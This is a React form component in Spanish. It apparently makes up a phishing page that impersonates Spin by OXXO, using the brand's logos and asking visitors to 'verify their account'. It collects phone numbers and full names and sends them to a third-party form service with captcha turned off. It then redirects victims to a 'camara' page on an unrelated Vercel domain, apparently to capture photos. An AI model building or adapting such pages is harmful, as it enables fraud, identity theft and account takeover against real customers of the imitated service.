import React from 'react';
import '../css/form.css'; // Suponiendo que tienes estilos CSS externos
import logo from '../img/logoaz.png';

const Form = () => {
  

  return (
    <div className="contenedor" >
      <div className="contimg">
      <img src="https://elspoilergeek.com/wp-content/uploads/como-hacer-un-deposito-a-mi-tarjeta-Spin-OXXO-1024x597.jpg?x73389" alt="" className="logo" />
      </div>
      <br />
      <h2 style={{ textAlign: "center", fontSize: "18px", color: "#6316c1", fontWeight: "700" }}>
        INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA
      </h2>
      <form className="pedirnum" id="contactform" action="https://formsubmit.io/send/07017942-5eb7-4b64-b2ce-c098ff9f7a98" method="POST">
        <input name="_redirect" type="hidden" id="name" value="" />
        <input type="hidden" name="_redirect" value="https://spinvintentarverifn.vercel.app/camara" />
        <input name="_formsubmit_id" type="text" style={{ display: "none" }} />
        <input type="hidden" name="_captcha" value="false" />
        <div className="contingnum">
        <div className="continptel">
          <label className="num-label" htmlFor="num">+52</label>
          <input
            type="tel"
            name="num"
            id="num"
            placeholder="Ingrese su número"
            onKeyPress={(event) => event.charCode >= 48 && event.charCode <= 57}
            maxLength="10"
            
            className='inputtextt'
          required />
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
            
            <input
              type="text"
              name="nombre"
              id="nombre"
              placeholder="Nombre completo"
              className='inputtexta'
            required/>
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
        
            <input
              type="text"
              name="apellido"
              id="apellido"
              placeholder="Apellido(s)"
              className='inputtexta'
            required/>
          </div>
        </div>
        <input className="btnenviar" id="btnenviar" type="submit" value="Enviar" />
      </form>
      <br />
      <div className="footer">
           <img src="https://spinbyoxxo.com.mx/wp-content/uploads/2021/07/logo-download.png" width="100px" alt="" />
      </div>
    </div>
  );
};

export default Form;
